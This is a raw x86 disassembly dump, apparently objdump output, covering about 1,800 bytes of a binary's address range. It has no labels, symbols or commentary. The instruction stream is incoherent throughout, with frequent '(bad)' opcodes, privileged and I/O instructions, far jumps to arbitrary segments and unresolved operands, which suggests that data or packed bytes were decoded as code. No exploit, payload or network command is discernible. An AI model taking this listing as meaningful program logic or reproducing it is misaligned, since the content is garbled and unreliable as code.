  41fd14:	and    edx,DWORD PTR [esi+0x2683242]
  41fd1a:	(bad)  
  41fd1d:	dec    ebp
  41fd1e:	mov    dl,0xdb
  41fd20:	fdivrp st(1),st
  41fd22:	loop   0x41fd8b
  41fd24:	scas   al,BYTE PTR es:[edi]
  41fd25:	push   ebp
  41fd26:	repz dec ebp
  41fd28:	mov    esi,0x47fa913e
  41fd2d:	sbb    DWORD PTR [edi+0x3a],0xe197f2b9
  41fd34:	into   
  41fd35:	js     0x41fd5f
  41fd37:	sahf   
  41fd38:	outs   dx,BYTE PTR ds:[esi]
  41fd39:	cmovb  edi,DWORD PTR [esi+0x2c5eb419]
  41fd40:	ja     0x41fda5
  41fd42:	loop   0x41fd7a
  41fd44:	ja     0x41fd95
  41fd46:	xchg   esi,eax
  41fd47:	rcr    BYTE PTR [edi+0x6f],cl
  41fd4a:	sub    BYTE PTR [ebp-0x21],al
  41fd4d:	(bad)  
  41fd4e:	imul   esp,edi,0x68
  41fd51:	imul   edx,ebp,0x4d
  41fd54:	dec    ebp
  41fd55:	clc    
  41fd56:	retf   
  41fd57:	loopne 0x41fd5a
  41fd59:	mov    ?,esi
  41fd5b:	sbb    eax,0xd53e6fa0
  41fd60:	das    
  41fd61:	pop    ebp
  41fd62:	jns    0x41fcf4
  41fd64:	jb     0x41fd1f
  41fd66:	add    bh,0x25
  41fd69:	outs   dx,BYTE PTR ds:[esi]
  41fd6a:	jmp    0x41fd69
  41fd6c:	(bad)  
  41fd6d:	fnstcw WORD PTR [ebp+ebp*8+0x73370cdb]
  41fd74:	adc    ebx,DWORD PTR [edi-0x80]
  41fd77:	push   ecx
  41fd78:	dec    ebp
  41fd79:	cs xchg edi,ebx
  41fd7c:	xchg   esi,eax
  41fd7d:	dec    eax
  41fd7e:	(bad)  
  41fd7f:	push   edi
  41fd80:	cmp    al,0x1e
  41fd82:	mov    ah,0xfa
  41fd84:	pop    ebx
  41fd85:	pop    es
  41fd86:	push   cs
  41fd87:	sub    eax,esi
  41fd89:	ins    BYTE PTR es:[edi],dx
  41fd8a:	push   edi
  41fd8b:	add    BYTE PTR [edi+0x28344e3c],dh
  41fd91:	aaa    
  41fd92:	std    
  41fd93:	cmc    
  41fd94:	in     al,dx
  41fd95:	stc    
  41fd96:	or     BYTE PTR [ebp-0x63],bh
  41fd99:	dec    ebx
  41fd9a:	mov    edi,0x2689e939
  41fd9f:	(bad)  
  41fda0:	test   DWORD PTR [edx],esp
  41fda2:	int3   
  41fda3:	cmp    al,0xed
  41fda5:	cmc    
  41fda6:	fisub  WORD PTR ds:0xf986acd0
  41fdac:	fwait
  41fdad:	test   edx,0x2e7a2ff2
  41fdb3:	icebp  
  41fdb4:	loop   0x41fde5
  41fdb6:	test   BYTE PTR [ecx],bl
  41fdb8:	and    al,dl
  41fdba:	daa    
  41fdbb:	in     al,dx
  41fdbc:	loop   0x41fd88
  41fdbe:	or     dl,BYTE PTR [edi+0x2]
  41fdc1:	sbb    al,0x8e
  41fdc3:	sub    edx,DWORD PTR [ebx-0x64]
  41fdc6:	and    BYTE PTR [ebx-0x2a],cl
  41fdc9:	xchg   edx,eax
  41fdca:	lods   eax,DWORD PTR ds:[esi]
  41fdcb:	cdq    
  41fdcc:	or     eax,0x294978c6
  41fdd1:	cs mov ebx,0xf3375402
  41fdd7:	and    ebx,DWORD PTR [edi]
  41fdd9:	out    dx,eax
  41fdda:	sub    ebp,DWORD PTR [ebx+ebp*2]
  41fddd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fdde:	sub    eax,0xa46f8a40
  41fde3:	aam    0xff
  41fde5:	js     0x41fd6d
  41fde7:	push   es
  41fde8:	inc    esp
  41fde9:	sbb    eax,0x78a54c
  41fdee:	xchg   edi,eax
  41fdef:	arpl   WORD PTR [esi],ax
  41fdf1:	outs   dx,DWORD PTR ds:[esi]
  41fdf2:	stos   DWORD PTR es:[edi],eax
  41fdf3:	mov    DWORD PTR [eax+0x43],eax
  41fdf6:	pop    esp
  41fdf7:	add    al,0x62
  41fdf9:	jne    0x41fe13
  41fdfb:	hlt    
  41fdfc:	fwait
  41fdfd:	rcr    BYTE PTR [eax+0x17],0xe7
  41fe01:	out    dx,al
  41fe02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fe03:	jle    0x41fdad
  41fe05:	scas   eax,DWORD PTR es:[edi]
  41fe06:	add    BYTE PTR [edi],ch
  41fe08:	(bad)  
  41fe09:	repnz lock leave 
  41fe0c:	sbb    ecx,DWORD PTR [ebp+0x26484c6c]
  41fe12:	cdq    
  41fe13:	inc    esi
  41fe14:	or     BYTE PTR [edi+0x7a],dl
  41fe17:	jecxz  0x41fe66
  41fe19:	sub    eax,0x7794de46
  41fe1e:	sub    ecx,DWORD PTR [ebp-0x32bc0705]
  41fe24:	xchg   esp,eax
  41fe25:	pop    ebx
  41fe26:	push   ecx
  41fe27:	retf   0xe954
  41fe2a:	dec    ebx
  41fe2b:	add    ch,BYTE PTR ds:0x5f1e80b1
  41fe31:	mov    ebx,0x312b352
  41fe36:	loop   0x41fe54
  41fe38:	(bad)  
  41fe39:	pop    esp
  41fe3a:	and    bl,BYTE PTR [esi+0x56cee3fd]
  41fe40:	cmp    BYTE PTR [ecx],ch
  41fe42:	inc    ebx
  41fe43:	rcl    BYTE PTR [eax-0x585323ce],0x7b
  41fe4a:	jb     0x41fe43
  41fe4c:	jb     0x41fe4e
  41fe4e:	aam    0x94
  41fe50:	ins    BYTE PTR es:[edi],dx
  41fe51:	iret   
  41fe52:	mov    ds:0x5e4a5a12,al
  41fe57:	jnp    0x41fe22
  41fe59:	dec    ebx
  41fe5a:	push   esi
  41fe5b:	ror    esi,cl
  41fe5d:	leave  
  41fe5e:	das    
  41fe5f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fe60:	les    eax,FWORD PTR [esi-0x321f2ec2]
  41fe66:	and    al,0x1c
  41fe68:	lea    esi,[ebp-0x63]
  41fe6b:	push   ebx
  41fe6c:	or     eax,0xda4c69e0
  41fe71:	call   0xf6c6b753
  41fe76:	mov    al,ds:0xe977da0a
  41fe7b:	or     BYTE PTR [edx],dh
  41fe7d:	xchg   esi,eax
  41fe7e:	mov    ds:0x7de1a796,eax
  41fe83:	mov    al,0x5a
  41fe85:	and    al,0x4c
  41fe87:	mov    al,0xe7
  41fe89:	mov    eax,0x62d1b45c
  41fe8e:	shl    DWORD PTR [ecx-0x51],0x1d
  41fe92:	pop    eax
  41fe93:	jno    0x41fe18
  41fe95:	js     0x41ff03
  41fe97:	xor    BYTE PTR [ecx+0x6edb3956],dl
  41fe9d:	imul   edi,DWORD PTR [ebx],0xfffffffe
  41fea0:	push   edi
  41fea1:	adc    esp,DWORD PTR [eax+0x29]
  41fea4:	neg    BYTE PTR [eax]
  41fea6:	lods   al,BYTE PTR ds:[esi]
  41fea7:	cmp    dh,BYTE PTR [esi]
  41fea9:	nop
  41feaa:	xchg   edi,eax
  41feab:	sahf   
  41feac:	mov    ecx,0x5709ef3d
  41feb1:	jnp    0x41fe48
  41feb3:	add    esi,ebp
  41feb5:	loope  0x41fec7
  41feb7:	mov    esp,eax
  41feb9:	in     al,dx
  41feba:	scas   eax,DWORD PTR es:[edi]
  41febb:	xor    edx,DWORD PTR [ecx+edx*4]
  41febe:	push   esp
  41febf:	push   0xffffffb3
  41fec1:	push   es
  41fec2:	iret   
  41fec3:	in     al,dx
  41fec4:	fimul  WORD PTR [edi+0x1]
  41fec7:	xor    al,0x4c
  41fec9:	pop    esi
  41feca:	mov    eax,0xb518b76e
  41fecf:	push   edi
  41fed0:	sbb    ecx,ebx
  41fed2:	cs popa 
  41fed4:	lock mov ds:0x3e330013,al
  41feda:	sbb    eax,DWORD PTR [eax-0x306edf56]
  41fee0:	push   0x58
  41fee2:	test   eax,0xd11fa6c8
  41fee7:	dec    ebx
  41fee8:	pop    esi
  41fee9:	cmp    eax,0xfd8dc9a8
  41feee:	mov    dh,0x8c
  41fef0:	lea    edi,[ecx+0x5b92a461]
  41fef6:	mov    ecx,0x34a5de26
  41fefb:	arpl   si,sp
  41fefd:	sbb    BYTE PTR [edi+0x41d855a6],bh
  41ff03:	push   ss
  41ff04:	aas    
  41ff05:	xlat   BYTE PTR ds:[ebx]
  41ff06:	xor    bl,cl
  41ff08:	jno    0x41ff4d
  41ff0a:	xchg   edi,eax
  41ff0b:	ja     0x41ff2a
  41ff0d:	jb     0x41ff09
  41ff0f:	cmp    ecx,esp
  41ff11:	test   eax,0xab5596bf
  41ff16:	pusha  
  41ff17:	icebp  
  41ff18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ff19:	mov    dh,0x1f
  41ff1b:	sbb    ch,dh
  41ff1d:	lods   al,BYTE PTR ds:[esi]
  41ff1e:	out    0x6f,eax
  41ff20:	sub    eax,0x19cf93ae
  41ff25:	jae    0x41ff08
  41ff27:	cmp    edx,ecx
  41ff29:	lahf   
  41ff2a:	dec    ebx
  41ff2b:	sub    eax,0xd91fc5
  41ff30:	or     ebx,DWORD PTR ds:0x1bb98345
  41ff36:	repnz mov ds:0xa145636d,al
  41ff3c:	mov    ebx,0x31c39029
  41ff41:	push   cs
  41ff42:	dec    ebx
  41ff43:	pop    ecx
  41ff44:	pop    edi
  41ff45:	jae    0x41ffb2
  41ff47:	or     cl,al
  41ff49:	sbb    BYTE PTR [esp+ecx*2+0x1b0960b2],bl
  41ff50:	mov    cl,BYTE PTR [eax+edx*4+0x4e7c9639]
  41ff57:	mov    ch,0x4e
  41ff59:	inc    ebp
  41ff5a:	ds retf 0x4d67
  41ff5e:	xor    ebp,DWORD PTR [ecx+0x25fe6295]
  41ff64:	cdq    
  41ff65:	dec    esp
  41ff66:	jno    0x41ff77
  41ff68:	cmp    ecx,esi
  41ff6a:	loop   0x41fef4
  41ff6c:	lea    esp,[eax]
  41ff6e:	mov    cl,0x44
  41ff70:	and    bh,ch
  41ff72:	ins    BYTE PTR es:[edi],dx
  41ff73:	sbb    BYTE PTR [edx],0x18
  41ff76:	nop
  41ff77:	mov    esp,0x255facee
  41ff7c:	ret    0x3265
  41ff7f:	cmp    ebx,esi
  41ff81:	mov    al,0xc3
  41ff83:	and    edi,DWORD PTR [edi+0x4720601]
  41ff89:	mov    cl,0x11
  41ff8b:	test   DWORD PTR [esi-0x63],edx
  41ff8e:	mov    ebp,0x7cf4a908
  41ff93:	push   0x1e
  41ff95:	test   BYTE PTR [eax+edx*1],dh
  41ff98:	and    ah,BYTE PTR [edx+0x31]
  41ff9b:	jb     0x420013
  41ff9d:	int    0xef
  41ff9f:	shr    DWORD PTR [ecx-0x7bd61aca],0xdc
  41ffa6:	sbb    eax,0x18fe1168
  41ffab:	sysenter 
  41ffad:	xchg   BYTE PTR [ebx+eax*2+0x259702a3],bl
  41ffb4:	sub    DWORD PTR [edi+0x2f],0x72
  41ffb8:	mov    esp,0xe2479753
  41ffbd:	inc    ebx
  41ffbe:	xlat   BYTE PTR ds:[ebx]
  41ffbf:	cmp    BYTE PTR [ecx-0x934b4d],bh
  41ffc5:	push   es
  41ffc6:	push   ebx
  41ffc7:	aas    
  41ffc8:	test   eax,0xedcc01fa
  41ffcd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ffce:	mov    WORD PTR [esi],?
  41ffd0:	push   esp
  41ffd1:	cmp    ebx,DWORD PTR [esi+0x72]
  41ffd4:	add    eax,0x451960e2
  41ffd9:	mov    ds:0xabe54389,al
  41ffde:	unpckhps xmm6,XMMWORD PTR [esi]
  41ffe1:	js     0x41ffdd
  41ffe3:	jbe    0x420012
  41ffe5:	or     al,0x7e
  41ffe7:	mov    ah,0xc1
  41ffe9:	into   
  41ffea:	xchg   esi,eax
  41ffeb:	mov    WORD PTR [esi-0x52],es
  41ffee:	ss or  edx,edi
  41fff1:	pop    esp
  41fff2:	loope  0x42005f
  41fff4:	and    DWORD PTR [edi+0x309ff30c],eax
  41fffa:	or     DWORD PTR [ebp+0x11],ecx
  41fffd:	adc    BYTE PTR [edi-0x5822ff87],bh
  420003:	cmp    DWORD PTR [ebx+esi*4],eax
  420006:	addr16 stc 
  420008:	fwait
  420009:	dec    ecx
  42000a:	push   edx
  42000b:	or     eax,0xa7fc9b2a
  420010:	scas   al,BYTE PTR es:[edi]
  420011:	aam    0xe9
  420013:	pusha  
  420014:	stos   BYTE PTR es:[edi],al
  420015:	addr16 pop eax
  420017:	dec    edi
  420018:	in     al,dx
  420019:	jg     0x42008c
  42001b:	adc    esi,DWORD PTR [eax]
  42001d:	fld    DWORD PTR [edi+ebp*8-0x6d]
  420021:	aam    0x65
  420023:	sbb    ah,BYTE PTR ds:0xa5666c76
  420029:	stc    
  42002a:	in     eax,0x36
  42002c:	push   esi
  42002d:	push   esi
  42002e:	jmp    0x420039
  420030:	ins    DWORD PTR es:[edi],dx
  420031:	inc    esp
  420032:	sub    al,0x86
  420034:	sbb    al,0x84
  420036:	shl    BYTE PTR [eax+eiz*8],cl
  420039:	test   al,dl
  42003b:	repz pop esp
  42003d:	xchg   ecx,eax
  42003e:	push   es
  42003f:	adc    BYTE PTR es:[ebx],ah
  420042:	mov    eax,ebx
  420044:	mov    ebp,0xc75b7288
  420049:	and    eax,esp
  42004b:	fwait
  42004c:	push   cs
  42004d:	daa    
  42004e:	fisubr WORD PTR [edi]
  420050:	(bad)  
  420051:	cmp    BYTE PTR [esp+edi*8],dl
  420054:	mov    BYTE PTR [eax],dh
  420056:	(bad)  [edi+esi*4+0x79c22c6f]
  42005d:	pop    ecx
  42005e:	add    bh,0x60
  420061:	fisubr DWORD PTR [edx]
  420063:	scas   eax,DWORD PTR es:[edi]
  420064:	pushf  
  420065:	call   0xd0340361
  42006a:	shl    ebx,1
  42006c:	adc    al,0x85
  42006e:	xor    BYTE PTR [ecx],dh
  420070:	std    
  420071:	inc    esi
  420072:	add    DWORD PTR [ebx+0x1b],0xfffffffe
  420076:	lds    ecx,FWORD PTR [esi+ebx*8-0x56cd2d26]
  42007d:	mov    esi,0xe0ad695c
  420082:	pop    ecx
  420083:	xor    cl,bl
  420085:	add    DWORD PTR [edx-0x48e52f87],ecx
  42008b:	test   DWORD PTR [esp+ebp*8+0x652aca37],0x1a2907d3
  420096:	or     dh,BYTE PTR [eax]
  420098:	mov    ah,BYTE PTR [esi*4-0x678eaddb]
  42009f:	lods   al,BYTE PTR ds:[esi]
  4200a0:	xor    eax,0xa066bd33
  4200a5:	sti    
  4200a6:	jecxz  0x420101
  4200a8:	push   0xffffff8a
  4200aa:	jne    0x4200be
  4200ac:	sbb    eax,0xd4bdbaf2
  4200b1:	cmp    al,0x90
  4200b3:	xor    al,0x37
  4200b5:	cdq    
  4200b6:	or     ebp,DWORD PTR [esp+eax*1]
  4200b9:	stos   DWORD PTR es:[edi],eax
  4200ba:	adc    ebx,esp
  4200bc:	ins    BYTE PTR es:[edi],dx
  4200bd:	retf   0xe22d
  4200c0:	ins    DWORD PTR es:[edi],dx
  4200c1:	rcl    BYTE PTR [esi],0xa8
  4200c4:	cmp    al,0xb7
  4200c6:	nop
  4200c7:	(bad)  
  4200c8:	shl    edx,0x58
  4200cb:	test   BYTE PTR [eax+0x6e],dl
  4200ce:	mov    ch,0x8e
  4200d0:	adc    BYTE PTR [edx],bl
  4200d2:	mov    dh,0xe2
  4200d4:	arpl   WORD PTR [ebx+0x7d73a80c],dx
  4200da:	xor    al,bh
  4200dc:	add    eax,0xb8c6ef1b
  4200e1:	lock loopne 0x420151
  4200e4:	mov    ds:0x9d56a0f4,al
  4200e9:	mov    cl,0x4a
  4200eb:	xchg   edi,eax
  4200ec:	xor    al,0xee
  4200ee:	mov    esp,0xc64b3965
  4200f3:	jae    0x420127
  4200f5:	jl     0x420176
  4200f7:	push   0x540b71fb
  4200fc:	cmp    ah,BYTE PTR [eax+0x1dde8375]
  420102:	stos   DWORD PTR es:[edi],eax
  420103:	leave  
  420104:	retf   0xc560
  420107:	mov    BYTE PTR [eax-0x4b],bh
  42010a:	pop    ss
  42010b:	dec    edi
  42010c:	xor    al,0xbb
  42010e:	cmp    eax,edx
  420110:	aam    0xd9
  420112:	dec    eax
  420113:	sub    ah,BYTE PTR [ecx]
  420115:	sub    BYTE PTR [ebx],cl
  420117:	dec    ecx
  420118:	sbb    eax,0xb2f37dc2
  42011d:	fucomi st,st(1)
  42011f:	pop    esp
  420120:	and    DWORD PTR [esi],edx
  420122:	cmc    
  420123:	bound  esi,QWORD PTR [eax-0x40]
  420126:	push   edx
  420127:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420128:	push   ss
  420129:	in     eax,0x3a
  42012b:	sbb    DWORD PTR [edi],0x7c
  42012e:	jp     0x42011f
  420130:	jb     0x42013b
  420132:	push   edi
  420133:	add    bl,BYTE PTR [edi+0x3a]
  420136:	ss stos DWORD PTR es:[edi],eax
  420138:	push   esp
  420139:	sbb    eax,0x95674852
  42013e:	sub    eax,0xb33ad511
  420143:	jl     0x4201a5
  420145:	cmp    edx,DWORD PTR [ebp-0x6b]
  420148:	mov    eax,0xdbae964d
  42014d:	jecxz  0x4200fe
  42014f:	stos   BYTE PTR es:[edi],al
  420150:	iret   
  420151:	in     al,dx
  420152:	xchg   esp,eax
  420153:	pop    ss
  420154:	fsub   QWORD PTR [edx]
  420156:	xor    DWORD PTR [edx-0xb1dc8b9],ebx
  42015c:	dec    esp
  42015d:	mov    ah,0xb1
  42015f:	pusha  
  420160:	in     eax,dx
  420161:	cmp    DWORD PTR [edi-0x30],0xd55f97d2
  420168:	out    dx,al
  420169:	(bad)  
  42016a:	int    0x68
  42016c:	pop    ds
  42016d:	mov    eax,ds:0xde3c5b5e
  420172:	adc    ebx,edi
  420174:	mov    eax,0xf79b189c
  420179:	rol    BYTE PTR [edx-0x2d0e485a],cl
  42017f:	inc    ecx
  420180:	in     eax,dx
  420181:	jnp    0x4201db
  420183:	popa   
  420184:	sbb    edx,DWORD PTR [ecx]
  420186:	or     ebp,ebx
  420188:	jmp    0x42013c
  42018a:	outs   dx,DWORD PTR gs:[esi]
  42018c:	(bad)  
  42018d:	icebp  
  42018e:	nop
  42018f:	fmul   DWORD PTR [edi+0x2242deca]
  420195:	int    0x18
  420197:	test   DWORD PTR [ecx],eax
  420199:	add    cl,BYTE PTR [ebp+0x55ca0d17]
  42019f:	cmp    dh,ch
  4201a1:	dec    esi
  4201a2:	mov    bl,BYTE PTR [ebx-0x537ecff2]
  4201a8:	jns    0x420202
  4201aa:	clc    
  4201ab:	jb     0x4201c3
  4201ad:	js     0x420142
  4201af:	and    BYTE PTR [esi-0x72],bl
  4201b2:	ja     0x4201d3
  4201b4:	mov    edx,0xd6719dcb
  4201b9:	xor    eax,0xb395f942
  4201be:	pop    esi
  4201bf:	xchg   esi,eax
  4201c0:	cmp    cl,BYTE PTR [ecx+0x188d7ce3]
  4201c6:	cmp    eax,0x40ab80c7
  4201cb:	add    edi,DWORD PTR [ecx-0x7]
  4201ce:	jle    0x420208
  4201d0:	or     ecx,0x3e4d276f
  4201d6:	das    
  4201d7:	and    ecx,DWORD PTR [esp+edi*1-0x7e3dce5f]
  4201de:	cli    
  4201df:	dec    eax
  4201e0:	(bad)  
  4201e1:	mov    bl,0x7
  4201e3:	jge    0x4201fd
  4201e5:	lock add al,0xcd
  4201e8:	fcomp  st(4)
  4201ea:	add    DWORD PTR [ebx-0x22],esi
  4201ed:	retf   0x36d8
  4201f0:	mov    eax,ds:0x4b9431c7
  4201f5:	push   0x7c076d01
  4201fa:	lea    ebp,[eax-0x4b]
  4201fd:	loopne 0x42018c
  4201ff:	cld    
  420200:	mov    bl,cl
  420202:	rcr    BYTE PTR [edx+0x685c3c59],cl
  420208:	call   FWORD PTR [ecx-0x75672ba5]
  42020e:	stos   DWORD PTR es:[edi],eax
  42020f:	or     eax,0xcf547586
  420214:	(bad)  
  420215:	xor    edi,esi
  420217:	gs push edi
  420219:	jo     0x420272
  42021b:	cmp    eax,0x9b4be0bc
  420220:	inc    esp
  420221:	adc    eax,esp
  420223:	xchg   ebx,eax
  420224:	push   cs
  420225:	test   al,0xac
  420227:	pusha  
  420228:	aas    
  420229:	adc    BYTE PTR ds:0x5bc97ef7,al
  42022f:	daa    
  420230:	fcomp  DWORD PTR [edx]
  420232:	dec    edx
  420233:	in     al,dx
  420234:	scas   eax,DWORD PTR es:[edi]
  420235:	and    DWORD PTR [ecx],0xffffff9f
  420238:	dec    ebx
  420239:	ins    BYTE PTR es:[edi],dx
  42023a:	dec    ebx
  42023b:	ret    
  42023c:	ror    dl,cl
  42023e:	je     0x42023f
  420240:	retf   0xb879
  420243:	gs and al,0x2f
  420246:	adc    eax,0x1cbb03d
  42024b:	sub    DWORD PTR [ecx+eax*4+0x35bf42f1],edx
  420252:	test   al,0xa7
  420254:	adc    edx,edx
  420256:	pop    es
  420257:	sar    DWORD PTR [ebx+0x7af9ee07],0x57
  42025e:	inc    edx
  42025f:	retf   0x5588
  420262:	mov    ebp,0x31792b7
  420267:	fadd   QWORD PTR [eax-0x9]
  42026a:	std    
  42026b:	les    eax,FWORD PTR [ebp-0x750b124b]
  420271:	jae    0x4202e1
  420273:	push   edi
  420274:	cld    
  420275:	push   edi
  420276:	ficomp DWORD PTR [eax]
  420278:	sbb    eax,0x428cb29
  42027d:	xchg   ecx,eax
  42027e:	inc    ecx
  42027f:	pop    ecx
  420280:	je     0x42025b
  420282:	xor    ebp,DWORD PTR [bp+di]
  420285:	mov    ebp,DWORD PTR [edx]
  420287:	icebp  
  420288:	mov    ah,0xfb
  42028a:	add    BYTE PTR [ecx+ecx*8+0x48],dl
  42028e:	mov    ah,0x1d
  420290:	and    DWORD PTR [edx+0x63],0x244eb638
  420297:	xor    DWORD PTR [ebp-0x13],eax
  42029a:	sti    
  42029b:	fdiv   DWORD PTR [edx-0x37]
  42029e:	hlt    
  42029f:	test   DWORD PTR [esi-0x34],0x623a7fd9
  4202a6:	mov    ecx,0x8947a58
  4202ab:	dec    ecx
  4202ac:	push   es
  4202ad:	loopne 0x420291
  4202af:	sbb    DWORD PTR [eax+0x1],ecx
  4202b2:	adc    al,0xa2
  4202b4:	inc    esp
  4202b5:	test   BYTE PTR [edx],0x91
  4202b8:	or     BYTE PTR [eax+edi*1+0x7a73a8a8],bh
  4202bf:	loopne 0x42032f
  4202c1:	push   0x85db8921
  4202c6:	mov    ds:0x2e13ff0c,al
  4202cb:	mov    es,WORD PTR [eax+eax*4]
  4202ce:	hlt    
  4202cf:	inc    ecx
  4202d0:	fs pop edi
  4202d2:	xor    DWORD PTR [ebx-0x2],esi
  4202d5:	imul   edi,DWORD PTR [eax+0x667d333d],0x543b9db1
  4202df:	lds    edi,FWORD PTR [edx-0x35]
  4202e2:	into   
  4202e3:	add    eax,DWORD PTR [edx+ebx*2]
  4202e6:	fdiv   QWORD PTR [edi+0x46]
  4202e9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4202ea:	dec    ebp
  4202eb:	mov    dl,0x32
  4202ed:	es push ds
  4202ef:	pop    edi
  4202f0:	or     al,0x2
  4202f2:	ins    BYTE PTR es:[edi],dx
  4202f3:	cdq    
  4202f4:	out    0xfc,eax
  4202f6:	sbb    ah,BYTE PTR [ecx+0x17]
  4202f9:	sahf   
  4202fa:	pop    ebx
  4202fb:	mul    BYTE PTR ds:[edi+ecx*1-0x4d]
  420300:	invd   
  420302:	not    BYTE PTR [ebp-0x5adfd6ee]
  420308:	in     al,0xec
  42030a:	ins    BYTE PTR es:[edi],dx
  42030b:	xchg   edx,eax
  42030c:	lods   eax,DWORD PTR ds:[esi]
  42030d:	gs (bad) 
  42030f:	pop    esp
  420310:	aaa    
  420311:	push   0x35
  420313:	daa    
  420314:	xchg   BYTE PTR [ebp+0x4d937cd3],ah
  42031a:	jmp    0x3bab:0xdd22775f
  420321:	jae    0x42036f
  420323:	dec    edx
  420324:	sbb    DWORD PTR [edx+0x60a11150],ebx
  42032a:	(bad)  
  42032b:	sbb    bh,bl
  42032d:	js     0x4202d8
  42032f:	aaa    
  420330:	cmc    
  420331:	cli    
  420332:	pop    ss
  420333:	push   ecx
  420334:	imul   eax,DWORD PTR [esi],0x21
  420337:	ror    BYTE PTR [edi-0x3d],cl
  42033a:	clc    
  42033b:	scas   al,BYTE PTR es:[edi]
  42033c:	(bad)  
  42033d:	push   cs
  42033e:	call   0xa640:0x4379
  420344:	pushf  
  420345:	mov    al,ds:0xda735ff1
  42034a:	xchg   esp,eax
  42034b:	inc    edx
  42034c:	lahf   
  42034d:	jns    0x420373
  42034f:	add    BYTE PTR [ecx+0x7711aa4a],ch
  420355:	mulps  xmm2,XMMWORD PTR [ecx+eiz*8+0x246e03fc]
  42035d:	add    al,0x0
  42035f:	dec    edx
  420360:	xor    DWORD PTR [eax],esp
  420362:	push   esi
  420363:	push   0x27
  420365:	push   eax
  420366:	mov    ebx,0x570f2f28
  42036b:	jmp    0x42033d
  42036d:	jmp    0x4203a1
  42036f:	add    DWORD PTR [ecx-0x79717cee],ecx
  420375:	sbb    al,0x9d
  420377:	div    ecx
  420379:	pop    eax
  42037a:	sub    eax,0x1157458f
  42037f:	xor    BYTE PTR [ecx],0xb3
  420382:	mov    DWORD PTR [eax+0x40],eax
  420385:	or     al,BYTE PTR [edi]
  420387:	call   0x4bc71389
  42038c:	dec    eax
  42038d:	mov    esp,0xfa3abedf
  420392:	mov    bh,0x45
  420394:	add    al,0xe0
  420396:	jae    0x4203d4
  420398:	mov    ds:0x58b8fb19,eax
  42039d:	mov    dh,0x2c
  42039f:	adc    ch,dh
  4203a1:	adc    DWORD PTR [edx],ebp
  4203a3:	jb     0x420325
  4203a5:	cmp    esi,DWORD PTR ds:0x2603f705
  4203ab:	loop   0x4203c1
  4203ad:	add    eax,0x7b6f3889
  4203b2:	dec    esi
  4203b3:	popf   
  4203b4:	add    DWORD PTR [esi+esi*1],ebp
  4203b7:	mov    eax,0xcf6f3e11
  4203bc:	adc    ch,BYTE PTR [ebx-0x18]
  4203bf:	cmp    ebp,DWORD PTR [ecx+0x6]
  4203c2:	cmp    DWORD PTR [edi+0x27d7fb99],ebp
  4203c8:	mov    ch,0xe1
  4203ca:	in     al,0x8e
  4203cc:	jg     0x420436
  4203ce:	add    ebp,DWORD PTR [ecx+0x20915c87]
  4203d4:	sar    DWORD PTR [esi+0x2c],0x9d
  4203d8:	je     0x4203ce
  4203da:	and    dh,BYTE PTR [edi-0x25071562]
  4203e0:	cmp    DWORD PTR [ecx-0x77],ebx
  4203e3:	fsubr  st,st(1)
  4203e5:	pop    ecx
  4203e6:	nop
  4203e7:	in     al,dx
  4203e8:	enter  0xc25c,0xf1
  4203ec:	lock ds popf 
  4203ef:	aam    0x1a
  4203f1:	leave  
  4203f2:	mov    bl,BYTE PTR [esi+ecx*4-0x3eeee1c5]
  4203f9:	imul   edx,DWORD PTR [edi+0x5d489c58],0xffffff80
  420400:	mov    esi,0x99f96763
  420405:	ins    BYTE PTR es:[edi],dx
  420406:	mov    bl,0x1c
  420408:	push   ds
  420409:	fcompp 
  42040b:	gs pop ebx
  42040d:	xchg   edi,eax
  42040e:	inc    esi
  42040f:	adc    eax,DWORD PTR [esi]
  420411:	leave  
  420412:	fsubr  QWORD PTR [ecx]
  420414:	test   DWORD PTR [ecx+ebp*8],0x53335e99
  42041b:	push   esp
  42041c:	push   edi
  42041d:	cld    
  42041e:	call   0x339b3122
  420423:	loop   0x4203bd
  420425:	xchg   ebp,eax
  420426:	sbb    ah,ah
  420428:	mov    esi,0xc1b63402
  42042d:	dec    ecx
  42042e:	mov    ch,0xb9
  420430:	adc    DWORD PTR [ebx],esp
  420432:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420433:	fnsave [edx-0x365875a4]
  420439:	pop    ebx
  42043a:	lods   al,BYTE PTR ds:[esi]
  42043b:	lock jbe 0x42041f
  42043e:	push   ss
  42043f:	cmp    al,0x2d
  420441:	ficom  DWORD PTR [edx+0x78]
  420444:	clc    
  420445:	add    cl,al
  420447:	jle    0x420431
  420449:	xor    ecx,DWORD PTR [esi+edx*1+0xe]
  42044d:	sub    BYTE PTR [esi+edx*2-0x3a604ec1],al
  420454:	dec    esp
  420455:	add    dl,BYTE PTR [eax+0x78a41f59]
  42045b:	sbb    eax,0x577ca278
  420460:	mov    eax,gs:0xa6f17d19
  420466:	adc    eax,0x2044d653
  42046b:	out    0x6a,al
  42046d:	push   ds
  42046e:	xor    edi,eax
  420470:	retf   0xf3a5
  420473:	mov    ah,bl
  420475:	mov    bh,0x6b
  420477:	jl     0x4204d0
  420479:	mov    ch,0xb8
  42047b:	adc    DWORD PTR [ebx-0x1d],edi
  42047e:	and    bl,BYTE PTR [edx+esi*1]
  420481:	jmp    0xb45b:0x18e1793a
  420488:	sub    bl,0xaf
  42048b:	pop    edi
  42048c:	dec    ebx
  42048d:	xor    ah,cl
  42048f:	sub    esi,DWORD PTR [eax-0x5a]
  420492:	adc    edx,DWORD PTR [eax-0x3b850bc3]
  420498:	leave  
  420499:	loop   0x420454
  42049b:	push   0x37d5c434
  4204a0:	sbb    cl,BYTE PTR [ecx-0x5d682ff]
  4204a6:	enter  0xdd13,0xdd
  4204aa:	pop    eax
  4204ab:	inc    edi
  4204ac:	pop    esp
  4204ad:	push   es
  4204ae:	pop    ds
  4204af:	pop    ebx
  4204b0:	xchg   ebx,eax
  4204b1:	sub    ecx,DWORD PTR [edi-0x63e66a62]
  4204b7:	add    edx,edx
  4204b9:	inc    ebp
  4204ba:	aaa    
  4204bb:	and    al,0x9
  4204bd:	sar    BYTE PTR [edx+eax*8+0x53fef22c],0x11
  4204c5:	es sbb al,0xe0
  4204c8:	cli    
  4204c9:	push   es
